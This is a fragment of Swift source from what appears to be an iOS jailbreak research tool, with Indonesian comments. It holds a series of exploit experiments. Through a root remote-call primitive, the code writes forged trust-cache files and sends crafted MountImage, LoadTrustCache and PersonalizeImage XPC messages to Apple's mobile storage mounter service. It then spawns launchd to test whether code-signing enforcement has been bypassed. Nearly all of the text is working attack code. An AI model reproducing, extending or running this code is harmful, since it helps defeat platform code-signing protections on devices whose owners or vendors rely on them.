        // Cleanup
        let sem2 = DispatchSemaphore(value: 0)
        root.executeAsRoot(operation: "exp111_cleanup") { rc in
            for path in writtenPaths {
                let p = remote_alloc_str(rc, path)
                RootExecutor.rcall(rc, "unlink", p)
                RootExecutor.rcall(rc, "free", p)
            }
            sem2.signal()
            return (true, "cleanup", 0)
        }
        sem2.wait()

        detail += "\n=== VERDICT ===\n"
        detail += "✅ Semua attempts terkirim!\n"
        detail += "MSM sekarang memproses:\n"
        detail += "  A) MountImage dari /private/var/personalized_debug\n"
        detail += "  B) LoadTrustCache dengan raw ImageTrustCache data\n"
        detail += "  C) LoadTrustCache dengan path ke .TrustCache file\n"
        detail += "  D) PersonalizeImage dengan type=debug\n\n"
        detail += "Jika TIDAK respring = MSM memproses tanpa crash!\n"
        detail += "Jika respring = salah satu attempt trigger bug di MSM\n"

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Exp 111A-D: Split MSM attempts + Exp 112

    #if !DISABLE_REMOTECALL

    /// Helper: connect MSM + create dict + set Command
    private func msmConnect(_ sb: RemoteCall) -> (conn: UInt64, xpcDictCreate: UInt64, xpcSetStr: UInt64, xpcSetData: UInt64, xpcSend: UInt64)? {
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_dictionary_set_data"))
        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_connection_send_message"))
        guard xpcCreate != 0 && xpcDictCreate != 0 else { return nil }
        let svc = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svc, 0, 0)
        RootExecutor.rcall(sb, "free", svc)
        guard conn != 0 else { return nil }
        RootExecutor.rcallAddr(sb, xpcResume, conn)
        return (conn, xpcDictCreate, xpcSetStr, xpcSetData, xpcSend)
    }

    private func msmSendDict(_ sb: RemoteCall, conn: UInt64, create: UInt64, setStr: UInt64, send: UInt64, pairs: [(String, String)]) {
        let msg = RootExecutor.rcallAddr(sb, create, 0, 0, 0)
        guard msg != 0 else { return }
        for (k, v) in pairs {
            let ka = remote_alloc_str(sb, k)
            let va = remote_alloc_str(sb, v)
            RootExecutor.rcallAddr(sb, setStr, msg, ka, va)
            RootExecutor.rcall(sb, "free", ka)
            RootExecutor.rcall(sb, "free", va)
        }
        RootExecutor.rcallAddr(sb, send, conn, msg)
    }

    /// 111A: HANYA MountImage debug path
    private func expMSM111A(sb: RemoteCall) -> ExperimentResult {
        var detail = "Exp 111A: MountImage debug path ONLY\n\n"
        guard let msm = msmConnect(sb) else {
            return ExperimentResult(name: "111A MountImage", success: false, detail: "MSM connect failed", timestamp: Date())
        }
        // Write .TrustCache dulu
        let sem = DispatchSemaphore(value: 0)
        root.executeAsRoot(operation: "111a_write") { rc in
            let dir = remote_alloc_str(rc, "/private/var/personalized_debug")
            RootExecutor.rcall(rc, "mkdir", dir, 0o755)
            RootExecutor.rcall(rc, "free", dir)
            let f = remote_alloc_str(rc, "/private/var/personalized_debug/.TrustCache")
            RootExecutor.rcall(rc, "unlink", f)
            let fd = RootExecutor.rcall(rc, "open", f, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
            if fd != UInt64(bitPattern: -1) {
                let b = rc.trojanMem + 0x800
                rc[b+0].setValue32(2); rc[b+4].setValue64(0xDEAD1337); rc[b+12].setValue64(0xBEEF0002)
                rc[b+20].setValue32(1); rc[b+24].setValue64(0x4141414141414141)
                rc[b+32].setValue64(0x4141414141414141); rc[b+40].setValue32(0x00024141)
                RootExecutor.rcall(rc, "write", fd, b, 48)
                RootExecutor.rcall(rc, "close", fd)
            }
            RootExecutor.rcall(rc, "free", f)
            sem.signal()
            return (true, "", 0)
        }
        sem.wait()

        msmSendDict(sb, conn: msm.conn, create: msm.xpcDictCreate, setStr: msm.xpcSetStr, send: msm.xpcSend, pairs: [
            ("Command", "MountImage"),
            ("ImagePath", "/private/var/personalized_debug"),
            ("ImageType", "Developer"),
        ])
        detail += "✅ Sent MountImage(path=/private/var/personalized_debug)\n"
        detail += "Kalau respring = MountImage yang trigger!\n"
        return ExperimentResult(name: "111A MountImage", success: true, detail: detail, timestamp: Date())
    }

    /// 111B: HANYA LoadTrustCache + ImageTrustCache data
    private func expMSM111B(sb: RemoteCall) -> ExperimentResult {
        var detail = "Exp 111B: LoadTrustCache + ImageTrustCache ONLY\n\n"
        guard let msm = msmConnect(sb) else {
            return ExperimentResult(name: "111B ImageTC", success: false, detail: "MSM connect failed", timestamp: Date())
        }
        let msg = RootExecutor.rcallAddr(sb, msm.xpcDictCreate, 0, 0, 0)
        guard msg != 0 else {
            return ExperimentResult(name: "111B ImageTC", success: false, detail: "dict create failed", timestamp: Date())
        }
        // Command + ImageType
        for (k, v) in [("Command", "LoadTrustCache"), ("ImageType", "Developer")] {
            let ka = remote_alloc_str(sb, k); let va = remote_alloc_str(sb, v)
            RootExecutor.rcallAddr(sb, msm.xpcSetStr, msg, ka, va)
            RootExecutor.rcall(sb, "free", ka); RootExecutor.rcall(sb, "free", va)
        }
        // ImageTrustCache = raw 48 bytes
        let tcBuf = sb.trojanMem + 0x800
        sb[tcBuf+0].setValue32(2); sb[tcBuf+4].setValue64(0xDEAD1337)
        sb[tcBuf+12].setValue64(0xBEEF0002); sb[tcBuf+20].setValue32(1)
        sb[tcBuf+24].setValue64(0x4141414141414141)
        sb[tcBuf+32].setValue64(0x4141414141414141); sb[tcBuf+40].setValue32(0x00024141)
        let kTC = remote_alloc_str(sb, "ImageTrustCache")
        RootExecutor.rcallAddr(sb, msm.xpcSetData, msg, kTC, tcBuf, 48)
        RootExecutor.rcall(sb, "free", kTC)
        RootExecutor.rcallAddr(sb, msm.xpcSend, msm.conn, msg)
        detail += "✅ Sent LoadTrustCache + ImageTrustCache(48B)\n"
        detail += "Kalau respring = ImageTrustCache yang trigger!\n"
        return ExperimentResult(name: "111B ImageTC", success: true, detail: detail, timestamp: Date())
    }

    /// 111C: HANYA LoadTrustCache + file path
    private func expMSM111C(sb: RemoteCall) -> ExperimentResult {
        var detail = "Exp 111C: LoadTrustCache + file path ONLY\n\n"
        guard let msm = msmConnect(sb) else {
            return ExperimentResult(name: "111C FilePath", success: false, detail: "MSM connect failed", timestamp: Date())
        }
        msmSendDict(sb, conn: msm.conn, create: msm.xpcDictCreate, setStr: msm.xpcSetStr, send: msm.xpcSend, pairs: [
            ("Command", "LoadTrustCache"),
            ("ImagePath", "/private/var/personalized_debug"),
            ("ImageType", "Developer"),
        ])
        detail += "✅ Sent LoadTrustCache(path=personalized_debug)\n"
        detail += "Kalau respring = file path LoadTrustCache yang trigger!\n"
        return ExperimentResult(name: "111C FilePath", success: true, detail: detail, timestamp: Date())
    }

    /// 111D: HANYA PersonalizeImage debug
    private func expMSM111D(sb: RemoteCall) -> ExperimentResult {
        var detail = "Exp 111D: PersonalizeImage debug ONLY\n\n"
        guard let msm = msmConnect(sb) else {
            return ExperimentResult(name: "111D Personalize", success: false, detail: "MSM connect failed", timestamp: Date())
        }
        msmSendDict(sb, conn: msm.conn, create: msm.xpcDictCreate, setStr: msm.xpcSetStr, send: msm.xpcSend, pairs: [
            ("Command", "PersonalizeImage"),
            ("ImagePath", "/private/var/personalized_debug"),
            ("ImageType", "Developer"),
            ("PersonalizedImageType", "debug"),
        ])
        detail += "✅ Sent PersonalizeImage(type=debug)\n"
        detail += "Kalau respring = PersonalizeImage yang trigger!\n"
        return ExperimentResult(name: "111D Personalize", success: true, detail: detail, timestamp: Date())
    }

    #endif

    // MARK: - Exp 112: TC Load + Immediate Spawn Test

    private func runExp112TCLoadSpawn() {
        isRunning = true
        runningLabel = "TC+Spawn"
        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc, mgr.rcready else {
            results.insert(ExperimentResult(name: "TC+Spawn (Exp 112)", success: false,
                detail: "No RC", timestamp: Date()), at: 0)
            isRunning = false; runningLabel = ""; return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expTCLoadSpawn(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false; self.runningLabel = ""
            }
        }
        #else
        isRunning = false; runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// Exp 112: Load TC via MSM lalu LANGSUNG spawn test
    /// Jika TC loaded = spawn binary tanpa SIGKILL = JAILBREAK!
    private func expTCLoadSpawn(sb: RemoteCall) -> ExperimentResult {
        let expName = "TC+Spawn (Exp 112)"
        var detail = "Experiment 112: Load TC → Immediate Spawn\n"
        detail += "============================================\n\n"

        // Step 1: Send LoadTrustCache ke MSM (pakai ImageTrustCache)
        detail += "=== Step 1: LoadTrustCache via MSM ===\n"
        guard let msm = msmConnect(sb) else {
            detail += "❌ MSM connect failed\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let msg = RootExecutor.rcallAddr(sb, msm.xpcDictCreate, 0, 0, 0)
        guard msg != 0 else {
            detail += "❌ dict create failed\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        for (k, v) in [("Command", "LoadTrustCache"), ("ImageType", "Developer")] {
            let ka = remote_alloc_str(sb, k); let va = remote_alloc_str(sb, v)
            RootExecutor.rcallAddr(sb, msm.xpcSetStr, msg, ka, va)
            RootExecutor.rcall(sb, "free", ka); RootExecutor.rcall(sb, "free", va)
        }

        // TC dengan CDHash dummy
        let tcBuf = sb.trojanMem + 0x800
        sb[tcBuf+0].setValue32(2); sb[tcBuf+4].setValue64(0xDEAD1337)
        sb[tcBuf+12].setValue64(0xBEEF0002); sb[tcBuf+20].setValue32(1)
        sb[tcBuf+24].setValue64(0x4141414141414141)
        sb[tcBuf+32].setValue64(0x4141414141414141); sb[tcBuf+40].setValue32(0x00024141)
        let kTC = remote_alloc_str(sb, "ImageTrustCache")
        RootExecutor.rcallAddr(sb, msm.xpcSetData, msg, kTC, tcBuf, 48)
        RootExecutor.rcall(sb, "free", kTC)
        RootExecutor.rcallAddr(sb, msm.xpcSend, msm.conn, msg)
        detail += "✅ LoadTrustCache sent\n"

        // Step 2: Spawn test via launchd
        detail += "\n=== Step 2: Spawn Test ===\n"

        var spawnRet: Int64 = -1
        var spawnPid: UInt32 = 0
        var spawnSig: Int32 = -1

        let sem = DispatchSemaphore(value: 0)
        root.executeAsRoot(operation: "exp112_spawn") { rc in
            let mem = rc.trojanMem
            let (ret, pid, _) = self.doSpawn(rc: rc, path: "/sbin/launchd", mem: mem)
            spawnRet = ret
            spawnPid = pid
            if ret == 0 && pid != 0 {
                let (sig, _) = self.doWait(rc: rc, pid: pid, mem: mem)
                spawnSig = sig
            }
            sem.signal()
            return (true, "spawn", 0)
        }
        sem.wait()

        detail += "posix_spawn(/sbin/launchd): ret=\(spawnRet), pid=\(spawnPid)\n"
        if spawnRet == 0 && spawnPid != 0 {
            detail += "exit signal: \(spawnSig)\n"
            if spawnSig != 9 {
                detail += "\n🎉🎉🎉 NO SIGKILL! TRUST CACHE LOADED! 🎉🎉🎉\n"
                detail += "FULL JAILBREAK ACHIEVED!\n"
            } else {
                detail += "\nSIGKILL — TC belum loaded (MSM reject silently)\n"
                detail += "Perlu: valid IMG4 signature atau exploit MSM validation\n"
            }
        } else {
            detail += "Spawn failed (ret=\(spawnRet))\n"
        }

        return ExperimentResult(name: expName, success: spawnSig != 9 && spawnPid != 0, detail: detail, timestamp: Date())
    }
    #endif

    
    #endif
}
